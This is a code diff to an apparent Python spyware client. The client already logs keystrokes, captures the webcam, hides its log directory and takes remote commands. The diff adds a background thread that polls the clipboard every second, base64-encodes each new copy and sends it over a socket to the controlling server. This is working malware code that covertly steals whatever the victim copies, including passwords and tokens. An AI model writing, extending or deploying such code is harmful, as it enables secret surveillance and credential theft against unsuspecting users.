@@ -15,6 +15,7 @@ import time
 import cv2
 import dotenv
 import pyautogui
+import pyperclip
 from pynput.keyboard import Listener
 
 # Global variables
@@ -92,6 +93,31 @@ def send_log_message(sock, filename):
             sock.sendall(json_data.encode())
     except socket.error as e:
         print(f'Error sending log message: {e}')
+
+
+# Function to detect copy
+def detect_copy(sock, filename):
+    global stop
+    previous_clipboard_content = pyperclip.paste()
+
+    while not stop:
+        time.sleep(1)
+        current_clipboard_content = pyperclip.paste()
+        current_clipboard_content_encoded = base64.b64encode(current_clipboard_content.encode()).decode()
+        if previous_clipboard_content != current_clipboard_content:
+            client_info = {
+                'filename': filename,
+                'command': 'COPY',
+                'clipboard_content': current_clipboard_content_encoded
+            }
+
+            json_data = json.dumps(client_info)
+            try:
+                sock.send(json_data.encode())
+            except socket.error as e:
+                print(f'Error sending clipboard content: {e}')
+                break
+            previous_clipboard_content = current_clipboard_content
 
 
 # Function to capture and send webcam image
@@ -229,6 +255,7 @@ def main():
     current_date = datetime.datetime.now().strftime("%d%m%Y")
     log_dir = LOG_DIR_WINDOWS if get_os() == 'Windows' else LOG_DIR_LINUX
     log_file = os.path.join(log_dir, f'{current_date}-{current_hour}.txt')
+    clipboard_file = f'{current_hour}-clipboard.txt'
 
     setup_logging(log_file)
     hide_dir(log_dir)
@@ -239,6 +266,8 @@ def main():
         listener.start()
         command_thread = threading.Thread(target=receive_commands, args=(sock,))
         command_thread.start()
+        copy_thread = threading.Thread(target=detect_copy, args=(sock, clipboard_file,))
+        copy_thread.start()
 
         try:
             while not stop:
